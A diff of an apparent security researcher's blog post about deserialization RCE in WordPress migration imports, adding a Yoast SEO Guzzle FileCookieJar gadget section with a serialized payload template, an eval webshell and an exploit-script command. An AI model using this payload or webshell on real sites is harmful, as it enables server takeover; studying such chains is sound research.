@@ -16,6 +16,8 @@ All-in-One WP Migration 是 WordPress 生态系统中最受欢迎的迁移插件
 
 ![All-in-One WP Migration 插件界面](/img/image-20260604174350742.png)
 
+后记：犯了一个很愚蠢的错误，我忘了这个功能本身是能上传php代码的，也就是说如果能上传恶意wpress，就能上传"善意webshell"。感觉对功能预期的情况进行仔细核查是非常重要且必要的，目前看来也是通过关键函数进行代码审计里很容易出问题的部分。
+
 ## 漏洞分析
 
 漏洞点在导入流程中 `class-ai1wm-import-options.php`对数据库查询结果调用 `maybe_unserialize()` 时未限制 `allowed_classes`，导致攻击者可通过备份文件中的序列化 payload 触发 `WP_HTML_Token` gadget 链实现 RCE。
@@ -361,3 +363,96 @@ Offset  Size    Field
 
 [EOF Block: 4377 bytes of null + archive_size + archive_crc]
 ```
+
+
+
+## yoast-GuzzleHttp-gadget
+
+后来我提交的漏洞被拒了，其中的一个理由就是wordpress6.4.1版本过老，要能在wordpress7.0上进行代码执行。经过审计，发现另一个高热插件`yoast-seo`存在`gadget`，该`gadget`是PHPGGC中已知的。
+
+```php
+// PHPGGC: gadgetchains/Guzzle/FW/1/chain.php
+class FW1 extends \PHPGGC\GadgetChain\FileWrite
+{
+    public static $version = '4.0.0-rc.2 <= 7.5.0+';
+    public static $vector = '__destruct';
+    public static $author = 'cfreal';
+
+    public function generate(array $parameters)
+    {
+        $path = $parameters['remote_path'];
+        $data = $parameters['data'];
+        return new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
+    }
+}
+```
+
+漏洞代码：
+
+```php
+// FileCookieJar.php:40-43
+public function __destruct()
+{
+    $this->save($this->filename);  // $filename 可控
+}
+
+// FileCookieJar.php:51-64
+public function save(string $filename) : void
+{
+    $json = [];
+    foreach ($this as $cookie) {
+        if (CookieJar::shouldPersist($cookie, $this->storeSessionCookies)) {
+            $json[] = $cookie->toArray();  // $cookie->data['Value'] 可控
+        }
+    }
+    $jsonStr = Utils::jsonEncode($json);
+    file_put_contents($filename, $jsonStr, LOCK_EX);  // 写入任意文件
+}
+
+// CookieJar.php:58-66
+public static function shouldPersist(SetCookie $cookie, bool $allowSessionCookies = false) : bool
+{
+    if ($cookie->getExpires() || $allowSessionCookies) {  // Expires=1 → true
+        if (!$cookie->getDiscard()) {                      // Discard=0 → true
+            return true;
+        }
+    }
+    return false;
+}
+```
+
+`payload`构造：
+
+```php
+O:49:"YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar":4:{
+    s:55:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar\0filename";
+        s:xx:"<shell_path>";           // 写入路径
+    s:63:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar\0storeSessionCookies";
+        b:1;                           // 允许持久化
+    s:52:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\CookieJar\0cookies";
+        a:1:{i:0;O:46:"YoastSEO_Vendor\GuzzleHttp\Cookie\SetCookie":1:{
+            s:53:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\SetCookie\0data";
+                a:3:{
+                    s:7:"Expires";i:1;   // shouldPersist=true
+                    s:7:"Discard";b:0;   // 不丢弃
+                    s:5:"Value";s:xx:"<?php eval($_POST['ant']); ?>";  // shell 代码
+                }
+        };}
+    s:51:"\0YoastSEO_Vendor\GuzzleHttp\Cookie\CookieJar\0strictMode";
+        b:0;                           // 不抛异常
+}
+```
+
+执行脚本
+
+```powershell
+.\exploit_fullauto_yoast.ps1 -Target "http://localhost/wordpress7" -User admin -Pass 123456
+```
+
+![image-20260611172223230](/img/image-20260611172223230.png)
+
+![image-20260611172246808](/img/image-20260611172246808.png)
+
+大概算是，成功了，又没完全成功。
+
+以上。
